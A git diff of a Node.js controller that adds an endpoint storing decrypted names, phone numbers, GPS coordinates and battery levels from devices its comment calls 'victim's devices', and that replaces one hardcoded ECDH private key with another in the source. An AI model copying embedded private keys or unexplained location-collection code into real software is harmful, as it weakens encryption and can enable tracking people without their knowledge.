@@ -5,6 +5,7 @@ var mongoose = require('mongoose'),
     _ = require('underscore');
 var Camara = require('../../app/models/camara');
 var Historial = require('../../app/models/historial');
+var StatusDevice = require('../../app/models/statusDevice');
 var Utilities = require('./utilities');
 var crypto = require('crypto');
 var ecdh = require('ecdh');
@@ -26,8 +27,8 @@ Encrypt = (function() {
   aliceKeys = ecdh.generateKeys(curve),
   bobKeys = ecdh.generateKeys(curve);
 
-  var pub_android = new Buffer("18f22134b490ee036f54238ee464e24e77f95033a603b7f013c03e701612e5ed", 'hex');
-  var pri_android = new Buffer("e4c1d53b4e905f0b663a29ee59cf86a8", 'hex');
+  var pub_android = new Buffer("G2YIoex+dKUX1nsMWmmraybgACjvR5dvlYg8BwKPWLw=", 'base64');
+  var pri_android = new Buffer("dn+4hiljaIyNrvsdTlcAlw==", 'base64');
 
   var publica = ecdh.PublicKey.fromBuffer(curve, pub_android);
   var privada = ecdh.PrivateKey.fromBuffer(curve, pri_android);
@@ -82,6 +83,10 @@ exports.historialindex = function (req, res) {
     res.render('historial');
 };
 
+exports.estadoindex = function (req, res) {
+    res.render('estado');
+};
+
 
 /************************************************************************************/
 /*******    API Responces                                                  **********/
@@ -114,6 +119,25 @@ exports.getHistorial = function (request, response) {
 /* Borrar historial de conexiones */
 exports.deleteHistorial = function (request, response) {
   Historial.remove({}, function (err) { });
+};
+
+/* Get estado */
+exports.getEstado = function (request, response) {
+    // StatusDevice.find({mac: "12:12:12:12:12:12"}).exec(function (err, historiales) {
+    //     if (err) return response.send(error);
+    //
+    //     var new_state = new StatusDevice({ mac: "14:14:13:13:11:22", name: "Jose", number: "666666666", latitude: "23,211122", longitude: "-12,123123", distance: 13, battery: "96%" });
+    //     new_state.save();
+    // });
+
+    StatusDevice.find({}, null, {sort: {distance: -1}},function (err, estados) {
+        if (!err) {
+            response.send(estados);
+        } else {
+            console.log(err);
+            response.send(error);
+        }
+    });
 };
 
 /* All cams */
@@ -236,5 +260,46 @@ exports.putoffline = function (request, response) {
         camara[0].time_offline = DTime_now;
         camara[0].save();
         response.send(ok);
+    });
+};
+
+/* update state of victim's devices */
+exports.updateStateDevice = function (request, response) {
+
+    if (Utilities.isEmpty(request.params.mac)) return response.send(error_400);
+
+    if (Utilities.isEmpty(request.body.name)) return response.send(error_400);
+    if (Utilities.isEmpty(request.body.number)) return response.send(error_400);
+    if (Utilities.isEmpty(request.body.latitude)) return response.send(error_400);
+    if (Utilities.isEmpty(request.body.longitude)) return response.send(error_400);
+    if (Utilities.isEmpty(request.body.battery)) return response.send(error_400);
+
+    var DName = Encrypt.decrypt(request.body.name);
+    var DNumber = Encrypt.decrypt(request.body.number);
+    var DLatitude = Encrypt.decrypt(request.body.latitude);
+    var DLongitude = Encrypt.decrypt(request.body.longitude);
+    var DBattery = Encrypt.decrypt(request.body.battery);
+
+    StatusDevice.find({mac: request.params.mac}).exec(function (err, device) {
+
+        if (err) return response.send(error);
+
+        // If it is empty, a new device will be saved on db
+        if (Utilities.isEmpty(device)){
+          var new_state = new StatusDevice({ mac: request.params.mac, name: DName, number: DNumber, latitude: DLatitude, longitude: DLongitude, distance: 0, battery: DBattery + "%" });
+          new_state.save();
+
+          response.send(ok);
+        } else {
+          device[0].name = DName;
+          device[0].number = DNumber;
+          device[0].latitude = DLatitude;
+          device[0].longitude = DLongitude;
+          device[0].distance = device[0].distance + 1;
+          device[0].battery = DBattery;
+          device[0].save();
+
+          response.send(ok);
+        }
     });
 };
